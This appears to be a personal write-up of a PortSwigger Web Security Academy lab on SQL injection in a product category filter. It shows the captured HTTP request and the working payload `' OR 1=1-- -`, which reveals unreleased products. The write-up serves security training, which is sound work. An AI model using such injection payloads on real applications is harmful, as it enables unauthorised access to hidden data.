---
tags:
  - sql
  - injection
---

# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## Instructions

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

## Solution

Selecting the "Gifts" category sends the following HTTP request:

```text title="Initial request"
GET /filter?category=Gifts HTTP/2
Host: 0ac600c104a6ea1f8142ac0500a90084.web-security-academy.net
Cookie: session=inWxWwQQf5vbyXBx1iITGLWCQLAigyvg
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac600c104a6ea1f8142ac0500a90084.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Adding a single quote after the query results in an error.

![](../../../../../site/_drafts/labs/PortSwigger/SQL-Injection/attachments/sqli-lab-1/file-20251124113610587.webp)

Adding a second single quote resolves the error. We can add an always true condition to display all products.

```text title="Final payload"
' OR 1=1-- -
```

![](../../../../../site/_drafts/labs/PortSwigger/SQL-Injection/attachments/sqli-lab-1/file-20251124113610590.webp)
